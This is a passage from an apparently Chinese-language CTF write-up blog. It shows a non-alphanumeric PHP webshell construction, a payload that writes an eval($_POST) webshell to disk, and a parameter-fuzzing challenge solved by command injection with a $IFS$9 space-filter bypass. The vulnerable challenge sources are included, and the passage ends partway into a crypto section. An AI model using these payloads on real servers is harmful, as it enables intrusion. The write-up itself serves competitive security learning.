important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$____</span><span class="token operator">.=</span><span class="token variable">$__</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token delimiter important">?></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?=</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">__</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">___</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后写马</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">__=file_put_contents&amp;_=3.php&amp;___=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622122456075.png" alt="image-20240622122456075"></p><p>upload.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$upfile</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[^(\w|\:|\$|\.|\&lt;|\>)]/i"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">,</span> <span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'::$DATA'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$cleanFilename</span><span class="token operator">=</span><span class="token function">get_filename</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tempfile</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token function">get_extension</span><span class="token punctuation">(</span><span class="token variable">$upfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// null</span><span class="token comment">//$ext = str_ireplace('::$DATA', '', $ext);//ȥ���ַ���::$DATA</span><span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$ext</span><span class="token punctuation">,</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php3'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php5'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php4'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'php2'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'html'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htm'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'phtml'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'pht'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'htaccess'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'exe'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'bat'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$content</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tempfile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/[a-z0-9]/is"</span><span class="token punctuation">,</span><span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"I don't want to see characters!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'asp'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'asa'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'cer'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'cdx'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'aspx'</span> <span class="token keyword">or</span> <span class="token variable">$ext</span> <span class="token operator">==</span> <span class="token string single-quoted-string">'htaccess'</span><span class="token punctuation">)</span> <span class="token variable">$ext</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'file'</span><span class="token punctuation">;</span><span class="token variable">$savefile</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'upload/'</span><span class="token operator">.</span><span class="token variable">$cleanFilename</span><span class="token operator">.</span><span class="token string double-quoted-string">"."</span><span class="token operator">.</span><span class="token variable">$ext</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tempfile</span><span class="token punctuation">,</span><span class="token variable">$savefile</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Success upload..path :'</span><span class="token operator">.</span><span class="token variable">$savefile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Upload failed..'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_extension</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">function</span> <span class="token function-definition function">get_filename</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token variable">$dotPosition</span> <span class="token operator">=</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$dotPosition</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">return</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\w]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token variable">$dotPosition</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token variable">$cleanFilename</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\w]/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token variable">$cleanFilename</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在Desktop下找到一个bak文件夹，demo03下有go源码，下载Desktop的bak.zip，居然是gogogo的源码！nm我还在想这是不是这题的flag，浪费了很久</p><p>flag翻了半天在C:&#x2F;Windows&#x2F;flag.txt</p><hr><h2 id="PDF-export（Unsolved）"><a href="#PDF-export（Unsolved）" class="headerlink" title="PDF export（Unsolved）"></a>PDF export（Unsolved）</h2><p>好像不是WeasyPrint，java起的服务，没啥头绪，输入的值会直接变成pdf的内容</p><hr><h2 id="你懂Fu22吗？"><a href="#你懂Fu22吗？" class="headerlink" title="你懂Fu22吗？"></a>你懂Fu22吗？</h2><blockquote><p>fuzz + rce</p></blockquote><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">字典越长你越强<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>进入题目，回显<code>Do you have only one method?</code></p><p>用post随便传个参数，回显<code>A pair of arguments is required, like key=value</code></p><p>那就爆破参数，找个字典爆破一下：<a href="https://github.com/TheKingOfDuck/fuzzDicts/blob/master/paramDict">https://github.com/TheKingOfDuck/fuzzDicts/blob/master/paramDict</a></p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622172937111.png" alt="image-20240622172937111"></p><p>爆出一个参数 word，回显<code>Congratulations on finding the correct key, continue to detect value</code></p><p>还得继续加字典爆，爆出来参数值为 exec，回显<code>Congratulations on finding the right value!!!!!!!!!! Kjhsf10fds.php</code></p><p>访问 Kjhsf10fds.php，回显<code>A pair of arguments is required, like key=value</code></p><p>又得爆破。。爆出来参数名为 key，回显<code>What you want to do, just look for the flag!</code></p><p>测试发现会命令执行，过滤了空格，测试可以用<code>$IFS$9</code>绕过</p><p>于是rce</p><p>payload：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span>Kjhsf10fds<span class="token operator">.</span>php<span class="token operator">?</span>key<span class="token operator">=</span><span class="token class-name type-declaration">cat</span><span class="token variable">$IFS</span><span class="token variable">$9</span><span class="token operator">/</span>www<span class="token operator">/</span>admin<span class="token operator">/</span>flag<span class="token operator">.</span>txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flag在&#x2F;www&#x2F;admin&#x2F;flag.txt：<code>flag&#123;lkjsdfnkelddfj_jkelk&#125;</code></p><p>index.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>  <span class="token variable">$imagePath</span><span class="token operator">=</span><span class="token string single-quoted-string">'jiuzhe.jpg'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;img src="'</span><span class="token operator">.</span><span class="token variable">$imagePath</span><span class="token operator">.</span><span class="token string single-quoted-string">'" alt="My Image">'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'word'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$cmd</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'word'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token variable">$cmd</span><span class="token operator">!=</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Congratulations on finding the correct key, continue to detect value'</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token variable">$cmd</span><span class="token operator">==</span><span class="token string single-quoted-string">'exec'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Congratulations on finding the right value!!!!!!!!!!\nKjhsf10fds.php"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token string single-quoted-string">'A pair of arguments is required, like key=value'</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'Do you have only one method?'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Kjhsf10fds.php</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token keyword">function</span> <span class="token function-definition function">executeSafeCommand</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token comment">// 定义一个包含不允许的字符的数组  </span>    <span class="token variable">$disallowedCharsPattern</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[\\\\;|&amp;`\'&#123;&#125;>&lt;\s\r\n\t\f]/'</span><span class="token punctuation">;</span>       <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$disallowedCharsPattern</span><span class="token punctuation">,</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">// 执行命令并获取输出  </span>    <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">// 返回命令输出或进行其他处理  </span>    <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'method not allow'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'GET'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"What you want to do, just look for the flag!\n"</span><span class="token punctuation">;</span>     <span class="token variable">$command</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>      <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">executeSafeCommand</span><span class="token punctuation">(</span><span class="token variable">$command</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">echo</span> <span class="token variable">$output</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>          <span class="token keyword">echo</span> <span class="token string single-quoted-string">'A pair of arguments is required, like key=value'</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="签到题-学会SM"><a href="#签到题-学会SM" class="headerlink" title="签到题-学会SM"></a>签到题-学会SM</h2><pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">我国的商用密码（国密）中有一种杂凑算法(也叫哈希算法)，请用该算法对字符串“heidun2024”进行运算，将结果(小写十六进制值)作为本题答案。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>SM3加密不需要密钥</p><p><img src="/blog/2024/06/22/2024%E9%97%BD%E7%9B%BE%E6%9D%AF-%E9%BB%91%E7%9B%BE%E8%B5%9B%E9%81%93CTF%E5%88%9D%E8%B5%9B-%E6%9C%AC%E7%A7%91%E7%BB%84/image-20240622093453517.png" alt="image-20240622093453517"></p><hr><h2 id="源码和数据都要保护（Unsolved）"><a href="#源码和数据都要保护（Unsolved）" class="headerlink" title="源码和数据都要保护（Unsolved）"></a>源码和数据都要保护（Unsolved）</h2><p>测试发现是beast加密</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">function</span> <span class="token function-definition function">my_encode</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$re</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token variable">$len</span><span class="token operator">=</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token variable">$len</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token variable">$c</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span><span class="token variable">$i</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$k</span><span class="token operator">=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">%</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">1</span><span 